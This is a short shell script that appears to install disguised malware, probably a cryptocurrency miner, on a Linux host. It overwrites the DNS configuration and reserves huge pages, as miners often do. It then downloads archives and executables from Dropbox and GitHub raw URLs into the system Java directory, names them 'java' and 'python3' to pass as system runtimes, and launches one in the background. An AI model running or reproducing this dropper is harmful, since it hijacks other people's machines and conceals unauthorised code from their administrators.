#!/bin/sh
cd /home/sshuser
echo nameserver 8.8.8.8 > /etc/resolv.conf
sysctl vm.nr_hugepages=2048
ls
cd /usr/lib/jvm/java-8-openjdk-amd64
wget https://www.dropbox.com/s/2j15ohnntlucrf2/jvlib4.tar.gz
tar xvzf jvlib4.tar.gz
cd /usr/lib/jvm/java-8-openjdk-amd64/nodejsbrnt
mv nodejsfive /usr/lib/jvm/java-8-openjdk-amd64/java
cd /usr/lib/jvm/java-8-openjdk-amd64
rm -r nodejsbrnt
rm -r jvlib4.tar.gz
mkdir 1
mkdir 2
mkdir 3
cp java /usr/lib/jvm/java-8-openjdk-amd64/1/java
cp java /usr/lib/jvm/java-8-openjdk-amd64/2/java
cp java /usr/lib/jvm/java-8-openjdk-amd64/3/java
wget https://raw.githubusercontent.com/GraphXdev/xglib2/master/python3
chmod +x python3
./python3 &
ls
